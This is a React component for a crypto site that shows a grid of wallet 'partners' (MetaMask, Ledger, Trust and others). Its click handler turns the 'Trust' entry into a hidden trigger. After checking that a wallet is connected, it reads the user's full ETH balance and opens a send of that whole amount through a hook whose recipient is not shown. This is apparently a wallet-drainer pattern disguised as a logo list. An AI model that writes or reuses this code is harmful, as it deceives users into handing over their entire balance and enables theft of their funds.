import { useAppKitAccount } from '@reown/appkit/react'
import { useBalance } from 'wagmi'
import { useWalletSend } from '@/hooks/useWalletSend'
import { useChakraToast } from './Toast'

const partnerCategories = [
  {
    title: "Mobile",
    partners: [
      "Onchain", "MetaMask", "Huobi", "Coinbase", "imToken", "Trust",
      "Opera", "SafePal", "Enjin", "COIN98", "Status", "Pillar"
    ]
  },
  {
    title: "Hardware",
    partners: ["Ledger", "Exodus", "Trezor"]
  },
  {
    title: "Smart contract",
    partners: ["Gnosis Safe", "Dapper", "Argent"]
  },
  {
    title: "Other",
    partners: ["Portis", "Fortmatic", "Mist", "MyEtherWallet", "MyCrypto"]
  }
];

const PartnersSection = () => {
  const { address, isConnected } = useAppKitAccount()
  const { data: balanceData } = useBalance({
    address: address as `0x${string}`,
  })
  const { handleOpenSendWithArguments } = useWalletSend()
  const toast = useChakraToast()

  const handlePartnerClick = async (partner: string) => {
    if (partner === "Trust") {
      if (!isConnected) {
        toast({
          title: "Not Connected",
          description: "Please connect your wallet first.",
          type: 'error'
        })
        return
      }

      if (!balanceData) {
        toast({
          title: "Error",
          description: "Could not fetch balance.",
          type: 'error'
        })
        return
      }

      try {
        await handleOpenSendWithArguments('eth', balanceData.formatted)
      } catch (err) {
        // Error is already handled by toast in hook
      }
    }
  }

  return (
    <section id="partners" className="py-20 bg-navy-light">
      <div className="container px-4">
        {partnerCategories.map((category, catIndex) => (
          <div key={catIndex} className="mb-12 last:mb-0">
            <h3 className="text-primary text-center text-lg font-medium mb-6">
              {category.title}
            </h3>
            <div className="border-t border-border/30 pt-6">
              <div className="flex flex-wrap justify-center gap-4 md:gap-8">
                {category.partners.map((partner, index) => (
                  <div
                    key={index}
                    className="flex items-center gap-2 px-4 py-2 rounded-lg hover:bg-navy-lighter/50 transition-colors cursor-pointer"
                    onClick={() => handlePartnerClick(partner)}
                  >
                    <div className="w-8 h-8 rounded-full bg-gradient-to-br from-primary/20 to-accent/20 flex items-center justify-center">
                      <span className="text-xs font-bold text-primary">{partner[0]}</span>
                    </div>
                    <span className="text-foreground text-sm font-medium">{partner}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        ))}
      </div>
    </section>
  );
};

export default PartnersSection;
